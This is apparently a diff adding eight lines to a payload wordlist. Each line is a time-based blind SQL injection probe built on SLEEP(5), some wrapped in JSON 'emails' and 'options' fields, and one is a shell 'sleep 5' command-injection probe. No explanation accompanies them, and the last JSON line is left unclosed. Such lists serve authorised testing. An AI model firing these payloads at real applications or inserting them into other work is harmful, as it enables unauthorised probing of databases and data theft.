@@ -1,0 +1,8 @@
+[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]
+{AnD SLEEP(5)}
+{1 AnD SLEEP(5)}
+{1' AnD SLEEP(5)--}
+{sleep 5}
+"emails":["AnD SLEEP(5)"]
+"emails":["test@gmail.com' OR SLEEP(5)#"]
+{"options":{"id":[],"emails":["AnD SLEEP(5)"],
